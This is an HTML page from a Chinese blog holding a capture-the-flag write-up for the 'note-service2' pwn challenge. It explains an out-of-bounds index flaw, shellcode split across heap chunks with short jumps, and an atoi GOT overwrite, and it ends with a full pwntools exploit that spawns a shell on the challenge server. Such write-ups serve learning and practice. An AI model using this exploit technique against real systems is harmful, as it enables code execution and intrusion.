@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="攻防世界PWN之note-service2题解首先看一下程序的保护机制，注意，PIE是开启的，这个checksec检测PIE有时候不准确。不过，我们看到NX是关闭的，说明堆栈的数据可以被当做指令执行  然后，我们用IDA分析一下,发现是一个很简单程序，并且只有添加和删除功能，其他功能未实现  创建这里，有三处值得我们注意   创建的堆空间大小最多为8字节 保存堆指针的数组下标可以越界  既然数组下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="note-service2">
+<meta property="og:url" content="http://example.com/2023/07/31/note-service2/index.html">
+<meta property="og:site_name" content="Dvgd">
+<meta property="og:description" content="攻防世界PWN之note-service2题解首先看一下程序的保护机制，注意，PIE是开启的，这个checksec检测PIE有时候不准确。不过，我们看到NX是关闭的，说明堆栈的数据可以被当做指令执行  然后，我们用IDA分析一下,发现是一个很简单程序，并且只有添加和删除功能，其他功能未实现  创建这里，有三处值得我们注意   创建的堆空间大小最多为8字节 保存堆指针的数组下标可以越界  既然数组下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/note-service2/20191110222658445.png">
+<meta property="og:image" content="http://example.com/images/note-service2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYQ==,size_16,color_FFFFFF,t_70.png">
+<meta property="og:image" content="http://example.com/images/note-service2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYQ==,size_16,color_FFFFFF,t_70-16908067987563.png">
+<meta property="og:image" content="http://example.com/images/note-service2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYQ==,size_16,color_FFFFFF,t_70-16908067987574.jpeg">
+<meta property="og:image" content="http://example.com/images/note-service2/20191110222825992.png">
+<meta property="og:image" content="http://example.com/images/note-service2/20191110222837422.png">
+<meta property="og:image" content="http://example.com/images/note-service2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYQ==,size_16,color_FFFFFF,t_70-16908067987575.png">
+<meta property="og:image" content="http://example.com/images/note-service2/20191110222931377.png">
+<meta property="og:image" content="http://example.com/images/note-service2/20191110222946756.png">
+<meta property="og:image" content="http://example.com/images/note-service2/20191110223002480.png">
+<meta property="article:published_time" content="2023-07-31T12:32:21.000Z">
+<meta property="article:modified_time" content="2023-07-31T12:38:16.376Z">
+<meta property="article:author" content="Dvgd">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/note-service2/20191110222658445.png">
+
+<link rel="canonical" href="http://example.com/2023/07/31/note-service2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>note-service2 | Dvgd</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Dvgd</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Dvgd</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">2</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">8</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">47</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/31/note-service2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          note-service2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-07-31 20:32:21 / 修改时间：20:38:16" itemprop="dateCreated datePublished" datetime="2023-07-31T20:32:21+08:00">2023-07-31</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="攻防世界PWN之note-service2题解"><a href="#攻防世界PWN之note-service2题解" class="headerlink" title="攻防世界PWN之note-service2题解"></a>攻防世界PWN之note-service2题解</h1><p>首先看一下程序的保护机制，注意，PIE是开启的，这个checksec检测PIE有时候不准确。不过，我们看到NX是关闭的，说明堆栈的数据可以被当做指令执行</p>
+<p><img src="/../images/note-service2/20191110222658445.png" alt="img"></p>
+<p>然后，我们用IDA分析一下,发现是一个很简单程序，并且只有添加和删除功能，其他功能未实现</p>
+<p><img src="/../images/note-service2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYQ==,size_16,color_FFFFFF,t_70.png" alt="img"></p>
+<p>创建这里，有三处值得我们注意</p>
+<p><img src="/../images/note-service2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYQ==,size_16,color_FFFFFF,t_70-16908067987563.png" alt="img"></p>
+<ol>
+<li>创建的堆空间大小最多为8字节</li>
+<li>保存堆指针的数组下标可以越界</li>
+</ol>
+<p>既然数组下标可以越界，那么我们就可以把任意的地方的8字节数据写成新建的堆的地址指针</p>
+<p>那么，通过数组越界，我们可以把一些函数的GOT表内容修改为堆指针，由于程序NX保护是关闭的，那么堆栈里的数据也可以当成指令执行。那么我们在堆里布置shellcode即可</p>
+<p>有一点需要注意的是，我们的堆空间最多为8字节，并且我们最多向里面输入7字节数据</p>
+<p><img src="/../images/note-service2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYQ==,size_16,color_FFFFFF,t_70-16908067987574.jpeg" alt="img"></p>
+<p>而我们的shellcode最少也要十几字节，因此，我们把shellcode分开，存储到多个堆里，然后在每个堆的最后2字节空间，填上jmp short xxxx指令，让它跳转到下一个堆里去执行代码。</p>
+<p>Jmp short xxxx指令占用2字节，并且，这条指令使用的是相对当前代码位置寻址， 为了发现规律，我们找几个现成的指令看看</p>
+<p><img src="/../images/note-service2/20191110222825992.png" alt="img"></p>
+<p>看看它们的十六进制</p>
+<p><img src="/../images/note-service2/20191110222837422.png" alt="img"></p>
+<p>首先，我们计算第一个看看</p>
+<p>0xE94 + 0x3B &#x3D; 0xECF</p>
+<p>0xEA0 + 0x2F &#x3D; 0xECF</p>
+<p>结果与目标地址还差2，因此，我们推断jmp short xxx中的xxx计算公式</p>
+<p>xxx &#x3D; 目标地址-当前地址-2</p>
+<p>经过试验和查阅资料，发现确实如此。</p>
+<p>由于我们创建堆的时候是按顺序创建下来的，并且期间没有进行删除操作，我们的堆统一为8字节(根据64位堆的数据结构，至少保证有prev_size、size、fd、bk的空间，实际上的大小为8 align to 32 &#x3D; 32字节)，并且，使用中的堆块的fd和bk被当成数据区，因此我们的数据是从这里开始的，导致后面还有0x8字节空数据。</p>
+<table>
+<thead>
+<tr>
+<th>Chunk0</th>
+<th>Prev_size</th>
+<th>0x8字节</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>size</td>
+<td>0x8字节</td>
+<td></td>
+</tr>
+<tr>
+<td>0x5字节 xxxx</td>
+<td>Chunk0的数据区0x8字节</td>
+<td></td>
+</tr>
+<tr>
+<td>(2字节) Jmp short next</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0空数据(1字节)</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x20-83 &#x3D; 0x8字节空数据</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Chunk1</td>
+<td>Prev_size</td>
+<td>0x8字节</td>
+</tr>
+<tr>
+<td>Size</td>
+<td>0x8字节</td>
+<td></td>
+</tr>
+<tr>
+<td>0x5字节 xxxx</td>
+<td>Chunk1的数据区</td>
+<td></td>
+</tr>
+<tr>
+<td>(2字节) Jmp short next</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0空数据(1字节)</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x20-83 &#x3D; 0x8字节空数据</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>现在我们想从chunk0的jmp出跳到chunk1的data处执行新代码，那么我们jmp short后面的偏移为</p>
+<p>注意那个末尾的1字节0，是输入函数给我们加上的，我们真正只能使用data区的7个字节，也就是我们的每个块里最多放7个字节的指令</p>
+<p>Jmp short后面的next值的计算</p>
+<p>next &#x3D; (8 + 8 + 8 + 1 + 2 - 2) &#x3D; 0x19</p>
+<p>现在我们就开始在堆里构造shellcode，我们的目的是在几个堆里构造处这样的代码</p>
+<ol>
+<li>;64位系统调用 </li>
+<li>mov rdi,xxxx;&#x2F;bin&#x2F;sh字符串的地址 </li>
+<li>mov rax,59;execve的系统调用号 </li>
+<li>mov rsi,0; </li>
+<li>mov rdx,0 </li>
+<li>syscall</li>
+</ol>
+<p>关键是rdi的值，在这里，如果我们将atoi的got表内容指向我们的第一个堆空间</p>
+<p><img src="/../images/note-service2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYQ==,size_16,color_FFFFFF,t_70-16908067987575.png" alt="img"></p>
+<p><img src="/../images/note-service2/20191110222931377.png" alt="img"></p>
+<p>那么当我们下一次输入选项时，我们输入&#x2F;bin&#x2F;sh就直接get到了shell</p>
+<p>因此，我们决定修改atoi的got表，让它指向我们的第一个堆</p>
+<p>但是，修改atoi的GOT表操作必须放到最后一步，因为我们修改atoi的got表后，就不能再做其他功能了，因为输入选项不再有效，想想为什么？</p>
+<p>但是，我们又得保证最后创建的那个堆位于其他几个堆的开头，即位于第一个堆，那么就可以先事先创建第一个堆用来占用那个空间，最后的时候delete掉后再申请回来(fastbin特性)，通过数组越界把它的指针存到atoi的GOT表里。</p>
+<p>那么atoi的GOT表和<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%95%B0%E7%BB%84&spm=1001.2101.3001.7020">数组</a>下标的关系是什么呢？</p>
+<p>我们的数组的静态地址在这</p>
+<p><img src="/../images/note-service2/20191110222946756.png" alt="img"></p>
+<p>然后，atoi的GOT表静态地址在这</p>
+<p><img src="/../images/note-service2/20191110223002480.png" alt="img"></p>
+<p>两者相差0x40字节,0x40 &#x2F; 8 &#x3D; 8字节，也就是说,数组下标-8处就是atoi的GOT表</p>
+<p>综上，我们的exp脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *    </span><br><span class="line">p = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">58097</span>)  </span><br><span class="line">elf=ELF(<span class="string">&#x27;./f&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">code1=asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>).ljust(<span class="number">5</span>,<span class="string">b&#x27;\x90&#x27;</span>)+<span class="string">b&#x27;\xeb\x19&#x27;</span></span><br><span class="line">code2=asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>).ljust(<span class="number">5</span>,<span class="string">b&#x27;\x90&#x27;</span>)+<span class="string">b&#x27;\xeb\x19&#x27;</span></span><br><span class="line">code3=asm(<span class="string">&#x27;mov eax,0x3b&#x27;</span>).ljust(<span class="number">5</span>,<span class="string">b&#x27;\x90&#x27;</span>)+<span class="string">b&#x27;\xeb\x19&#x27;</span></span><br><span class="line">code4=asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,code1)</span><br><span class="line">add(<span class="number">1</span>,code1)</span><br><span class="line">add(<span class="number">2</span>,code2)</span><br><span class="line">add(<span class="number">3</span>,code3)</span><br><span class="line">add(<span class="number">4</span>,code4)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#把第一个堆块申请回来，存入指令，并且把堆指针赋值给数组的-8下标处(atoi的GOT表处)，即修改了atoi的GOT表</span></span><br><span class="line">add(-<span class="number">8</span>,code1)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>
+
+<p>脚本中，某些指令有一些技巧，我们必须腾出2字节用于jmp，而某些指令一条就会占用7字节，因此我们换成其他指令，比如mov rsi,0这条指令，我们换成xor rsi,rsi，就有空间来写jmp指令了。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/31/Recho/" rel="prev" title="Recho">
+      <i class="fa fa-chevron-left"></i> Recho
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/08/05/Tea/" rel="next" title="Tea">
+      Tea <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E4%B9%8Bnote-service2%E9%A2%98%E8%A7%A3"><span class="nav-number">1.</span> <span class="nav-text">攻防世界PWN之note-service2题解</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Dvgd"
+      src="/images/Dvgd.jpg">
+  <p class="site-author-name" itemprop="name">Dvgd</p>
+  <div class="site-description" itemprop="description">Welcome to my blog.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yourname" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/yourname" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;yourname" rel="noopener" target="_blank"><i class="weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+	   <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1861579836&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Dvgd</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+
+</body>
+</html>
+<!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效2 -->
+<script type="text/javascript" src="/js/snow2.js"></script>
+
+<!-- 樱花特效 -->
+  
+      <script async src="/js/fairyDustCursor.js"></script>
+  
+
+
